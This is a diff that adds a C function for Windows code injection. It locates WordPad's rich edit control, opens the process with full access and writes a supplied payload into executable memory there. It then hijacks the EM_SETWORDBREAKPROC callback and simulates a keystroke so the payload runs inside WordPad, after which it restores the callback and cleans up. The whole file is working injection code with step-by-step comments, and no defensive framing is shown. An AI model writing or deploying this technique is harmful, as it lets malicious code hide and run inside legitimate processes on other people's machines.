@@ -1,0 +1,52 @@
+VOID wordwarping(LPVOID payload, DWORD payloadSize) {
+    HANDLE        hp;
+    DWORD         id;
+    HWND          wpw, rew;
+    LPVOID        cs, wwf;
+    SIZE_T        rd, wr;
+    INPUT         ip;
+    
+    // 1. Get main window for wordpad.
+    //    This will accept simulated keyboard input.
+    wpw = FindWindow(L"WordPadClass", NULL);
+    
+    // 2. Find the rich edit control for wordpad.
+    rew = FindWindowEx(wpw, NULL, L"RICHEDIT50W", NULL);
+
+    // 3. Try get current address of Wordwrap function
+    wwf = (LPVOID)SendMessage(rew, EM_GETWORDBREAKPROC, 0, 0);
+
+    // 4. Obtain the process id for wordpad.
+    GetWindowThreadProcessId(rew, &id);
+
+    // 5. Try open the process.
+    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+
+    // 6. Allocate RWX memory for the payload.
+    cs = VirtualAllocEx(hp, NULL, payloadSize,
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    // 7. Write the payload to memory
+    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
+
+    // 8. Update the callback procedure
+    SendMessage(rew, EM_SETWORDBREAKPROC, 0, (LPARAM)cs);
+
+    // 9. Simulate keyboard input to trigger payload
+    ip.type           = INPUT_KEYBOARD;
+    ip.ki.wVk         = 'A';
+    ip.ki.wScan       = 0;
+    ip.ki.dwFlags     = 0;
+    ip.ki.time        = 0;
+    ip.ki.dwExtraInfo = 0;
+    
+    SetForegroundWindow(rew);
+    SendInput(1, &ip, sizeof(ip));
+
+    // 10. Restore original Wordwrap function (if any)
+    SendMessage(rew, EM_SETWORDBREAKPROC, 0, (LPARAM)wwf);
+    
+    // 11. Free memory and close process handle
+    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
+    CloseHandle(hp);
+}
